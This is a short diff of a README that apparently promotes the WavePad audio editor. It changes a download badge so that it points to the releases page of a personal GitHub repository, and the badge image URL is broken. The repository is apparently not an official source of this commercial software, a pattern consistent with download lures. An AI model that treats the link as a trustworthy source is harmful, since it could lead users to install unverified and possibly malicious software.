@@ -52,7 +52,7 @@ Explore the following topics related to audio editing and enhancement covered in
 
 To experience the power of WavePad and take your audio projects to the next level, download the software from the following link:
 
-[![Download WavePad](https://img.shields.io/badge/Download-WavePad-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download WavePad](https://github.com/jetteuan/WavePad/releases)](https://github.com/jetteuan/WavePad/releases)
 
 ---
 
